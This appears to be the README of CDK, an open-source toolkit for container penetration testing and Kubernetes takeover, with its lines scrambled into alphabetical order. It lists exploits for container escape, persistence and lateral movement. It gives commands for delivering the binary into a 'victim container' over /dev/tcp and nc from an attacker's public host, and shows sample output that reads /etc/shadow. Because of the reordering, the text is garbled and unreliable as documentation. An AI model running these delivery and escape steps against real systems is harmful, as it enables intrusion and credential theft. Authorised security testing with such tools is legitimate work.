
  -h --help     Show this help msg.
  -v --version  Show version.
  <img src="https://contrib.rocks/image?repo=cdk-team/cdk" />
  cdk <tool> [<args>...]
  cdk auto-escape <cmd>                     Escape container in different ways then let target execute <cmd>.
  cdk evaluate                              Gather information to find weakness inside container.
  cdk evaluate --full                       Enable file scan during information gathering.
  cdk evaluate [--full]
  cdk run (--list | <exploit> [<args>...])
  cdk run --list                            List all available exploits.
  cdk run <exploit> [<args>...]             Run single exploit, docs in https://github.com/cdk-team/CDK/wiki
  ectl <endpoint> get <key>                 Unauthorized enumeration of ectd keys.
  ifconfig                                  Show network information.
  kcurl <path> (get|post) <uri> <data>      Make request to K8s api-server.
  nc [options]                              Create TCP tunnel.
  probe <ip> <port> <parallel> <timeout-ms> TCP port scan, example: cdk probe 10.0.1.0-255 80,8080-9443 50 1000
  ps                                        Show process information like "ps -ef" command.
  ucurl (get|post) <socket> <uri> <data>    Make request to docker unix socket.
  vi <file>                                 Edit files in container like "vi" command.
![png](https://github.com/knownsec/404StarLink-Project/raw/master/logo.png)
![png](https://user-images.githubusercontent.com/7868679/177925206-8d83dc95-0f2f-4d61-9a45-0d43b1b0468f.png)
# CDK - Zero Dependency Container Penetration Toolkit
# CDK-Deploy-Test
## Contributing to CDK
## Developer Docs
## Events
## Features
## Installation/Delivery
## Legal Disclaimer
## Overview
## Quick Start
## Usage
### 404StarLink 2.0 - Galaxy
### BlackHat Asia 2021 Arsenal
### Evaluate Module
### Exploit Module
### HITB SecConf 2021 Amsterdam
### KCON 2021 Arsenal
### Kubernetes community Days 2021 
### Release Document
### TIPS: Deliver CDK into target container in real-world penetration testing
### Tool Module
#### Bug Reporting
#### Pull Requests
#### Suggesting Enhancements
(on your host)
* Describe the current CDK version, environment, problem and exact steps that reproduce the problem.
* Explain why this enhancement would be useful to other users.
* If you are committing a new evaluate/exploit scripts, please add a simple doc to your PR message, here is an [example](https://github.com/cdk-team/CDK/wiki/Exploit:-docker-sock-deploy).
* Please enable a sustainable environment for us to review contributions.
* Running screenshots or logs before and after you fix the problem.
* Screenshots about how this new feature works.
* [run test in container.](https://github.com/cdk-team/CDK/wiki/Run-Test)
* https://github.com/cdk-team/CDK/wiki/Run-Test**Note about Thin:** The **thin release** is prepared for short life container shells such as serverless functions. We add build tags in source code and cut a few exploits to get the binary lighter. The 2MB file contains 90% of CDK functions, also you can pick up useful exploits in CDK source code to build your own lightweight binary.
- [Briefing: "Attack Cloud Native Kubernetes"](https://conference.hitb.org/hitbsecconf2021ams/sessions/attacking-cloud-native-kubernetes-with-cdk/)
- [CDK: Also a Awesome BugBounty Tool for Cloud Platform](https://github.com/neargle/slidefiles/blob/main/2021%20WHC2021%20CDK-Also-a-Awesome-BugBounty-Tool-for-Cloud-Platform.pptx.pdf)
- [http://kcon.knownsec.com/2021/#/arsenal](http://kcon.knownsec.com/2021/#/arsenal)
- [https://community.cncf.io/events/details/cncf-kcd-china-presents-kubernetes-community-days-china/](https://community.cncf.io/events/details/cncf-kcd-china-presents-kubernetes-community-days-china/)
- [https://github.com/knownsec/404StarLink2.0-Galaxy#community](https://github.com/knownsec/404StarLink2.0-Galaxy#community)
- [https://www.blackhat.com/asia-21/arsenal/schedule/index.html#cdk-zero-dependency-container-penetration-toolkit-22422](https://www.blackhat.com/asia-21/arsenal/schedule/index.html#cdk-zero-dependency-container-penetration-toolkit-22422)
1. Evaluate: gather information inside container to find potential weakness.
1. First, host CDK binary on your host with public IP.
2. Exploit: for container escaping, persistance and lateral movement
2. Inside the victim container execute
3. Tool: network-tools and APIs for TCP/HTTP requests, tunnels and K8s cluster management.
</a>
<a href="https://github.com/cdk-team/cdk/graphs/contributors">
> ./cdk eva --full
> ./cdk run cap-dac-read-search
Auto Escape:
Bugs are tracked as [GitHub Issues](https://github.com/cdk-team/CDK/issues). Create an issue with the current CDK version, error msg and the environment. Describe the exact steps which reproduce the problem.
CDK has three modules:
CDK is an open-sourced container penetration toolkit, designed for offering stable exploitation in different slimmed containers without any OS dependency. It comes with useful net-tools and many powerful PoCs/EXPs and helps you to escape container and take over K8s cluster easily.
CDK is for security testing purposes only.
Critical - Possible Privileged Container Found.
Critical - SYS_ADMIN Capability Found. Try 'cdk run rewrite-cgroup-devices/mount-cgroup/...'.
Download latest release in https://github.com/cdk-team/CDK/releases/
Drop executable files into the target container and start testing.
Enhancement suggestions are tracked as [GitHub Discussions](https://github.com/cdk-team/CDK/discussions). You can publish any thoughts here to discuss with developers directly.
Evaluate:
Exploit:
First off, thanks for taking the time to contribute!
Fix problems or maintain CDK's quality:
If you have a RCE exploit, but the target container has no `curl` or `wget`, you can use the following method to deliver CDK:
If you have an exploit that can upload a file, then you can upload CDK binary directly.
If you want to know how we released a new version, how thin is produced, why we provide upx versions, what the differences between different versions about all, normal, thin, upx are, and how to choose specific CDK exploits and tools to compile an own release for yourself, please check the [Release Document](https://github.com/cdk-team/CDK/wiki/Release).
List all available exploits:
New feature or exploits:
Options:
Project CDK is now included in 404Team [Starlink Project 2.0](https://github.com/knownsec/404StarLink2.0-Galaxy). Join the StarLink community to get in touch with CDK dev-team.
Run **`cdk eva`** to get evaluate info and a recommend exploit, then run **`cdk run`** to start the attack.
Run targeted exploit:
Running commands like in Linux, little different in input-args, see the usage link.
Running with target: /etc/shadow, ref: /etc/hostname
Thanks for the following contributors:
This command will run the scripts below without local file scanning, using `--full` to enable all.
This is the function test script, see doc: 
Tool:
Usage
Usage of CDK for attacking targets without prior mutual consent is illegal.
Usage:
[!] CAP_DAC_READ_SEARCH enabled. You can read files from host. Use 'cdk run cap-dac-read-search' ... for exploitation.
[!] CAP_SYS_MODULE enabled. You can escape the container via loading kernel module. More info at https://xcellerator.github.io/posts/docker_escape/.
[*] Maybe you can exploit the *Capabilities* below:
```
bin:*:18659:0:99999:7:::
cat < /dev/tcp/(your_public_host_ip)/(port) > cdk
cdk evaluate [--full]
cdk nc [options]
cdk ps
cdk run --list
cdk run <script-name> [options]
chmod a+x cdk
daemon:*:18659:0:99999:7:::
nc -lvp 999 < cdk
root:*:18659:0:99999:7:::
ubuntu:$6$*******:19173:0:99999:7:::
| Tactic               | Technique                                                  | CDK Exploit Name       | Supported | In Thin                                                                    | Doc                                                                                  |
|----------------------|------------------------------------------------------------|------------------------|-----------|----------------------------------------------------------------------------|--------------------------------------------------------------------------------------|
|---|---|---|---|
|Command|Description|Supported|Usage/Example|
|Tactics|Script|Supported|Usage/Example|
|rcurl|Request to Docker Registry API|||
